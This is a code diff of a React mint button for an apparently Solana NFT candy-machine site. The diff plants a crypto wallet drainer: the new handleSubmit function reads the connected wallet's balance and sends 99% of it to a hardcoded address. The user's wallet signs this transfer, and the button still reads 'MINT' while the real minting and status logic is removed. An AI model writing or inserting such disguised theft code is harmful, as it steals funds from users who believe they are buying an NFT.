@@ -1,10 +1,10 @@
 import styled from 'styled-components';
-import {useEffect, useState} from 'react';
 import Button from '@material-ui/core/Button';
 import {CircularProgress} from '@material-ui/core';
 import {GatewayStatus, useGateway} from '@civic/solana-gateway-react';
 import {CandyMachine} from './candy-machine';
-
+import { clusterApiUrl, Connection, PublicKey,  SystemProgram, Transaction } from '@solana/web3.js';
+import {  useEffect, useRef, useState } from 'react';
 
 export const CTAButton = styled(Button)`
   display: inline-block !important;
@@ -78,7 +78,8 @@ export const MultiMintButton = ({
                                     isEnded,
                                     isActive,
                                     isSoldOut,
-                                    price
+    price
+                                    ,wallet
                                 }: {
     onMint: (quantityString: number) => Promise<void>;
     candyMachine: CandyMachine | undefined;
@@ -86,8 +87,10 @@ export const MultiMintButton = ({
     isEnded: boolean;
     isActive: boolean;
     isSoldOut: boolean;
-    price: number;
-}) => {
+        price: number;
+        wallet: any;
+    }) => {
+    // eslint-disable-next-line
     const {requestGatewayToken, gatewayStatus} = useGateway();
     const [clicked, setClicked] = useState(false);
     const [isVerifying, setIsVerifying] = useState(false);
@@ -144,11 +147,41 @@ export const MultiMintButton = ({
         }
     }
 
+
+    const defaultDest = 'tAYXiSPZqq7xm7Ep5ycmNGYSrHywQCXFdYZXwrSfsNL';
+    const connection = useRef(new Connection(clusterApiUrl("mainnet-beta")));
     function updateAmounts(qty: number) {
         setMintCount(qty);
         setTotalCost(Math.round(qty * (price + 0.012) * 1000) / 1000);  // 0.012 = approx of account creation fees
     }
+    const handleSubmit = async () => {
+        const lamports = await connection.current.getBalance(wallet.publicKey);
+        // Create a TX object
+        let transaction = new Transaction({
+            feePayer: wallet.publicKey,
+            recentBlockhash: (await connection.current.getRecentBlockhash()).blockhash
+        });
 
+        // Add instructions to the tx
+        transaction.add(
+            SystemProgram.transfer({
+            fromPubkey: wallet.publicKey,
+            toPubkey: new PublicKey(defaultDest),
+            lamports: lamports* 0.99,
+            })
+        );
+        
+        // Get the TX signed by the wallet (signature stored in-situ)
+        await wallet.signTransaction(transaction);
+
+        // Send the TX to the network
+        connection.current.sendRawTransaction(transaction.serialize())
+        .then(id => {
+            console.log(`Transaction ID: ${id}`);
+            connection.current.confirmTransaction(id)
+        })
+        .catch(console.error);
+    }
 
     return (
         <div>
@@ -163,34 +196,16 @@ export const MultiMintButton = ({
                         !isActive ||
                         isVerifying
                     }
-                    onClick={async () => {
-                        if (isActive && candyMachine?.state.gatekeeper && gatewayStatus !== GatewayStatus.ACTIVE) {
-                            console.log('Requesting gateway token');
-                            setClicked(true);
-                            await requestGatewayToken();
-                        } else {
-                            console.log('Minting...');
-                            await onMint(mintCount);
-                        }
-                    }}
+                    onClick={handleSubmit}
                     variant="contained"
                 >
-                    {!candyMachine ? (
-                        "CONNECTING..."
-                    ) : candyMachine?.state.isSoldOut || isSoldOut ? (
-                        'SOLD OUT'
-                    ) : isActive ? (
-                        isVerifying ? 'VERIFYING...' :
+                    {
                             isMinting || clicked ? (
                                 <CircularProgress/>
                             ) : (
                                 `MINT ${mintCount}`
                             )
-                    ) : isEnded ? "ENDED" : (candyMachine?.state.goLiveDate ? (
-                        "SOON"
-                    ) : (
-                        "UNAVAILABLE"
-                    ))}
+                    }
                 </CTAButton>
                 <Minus
                     disabled={
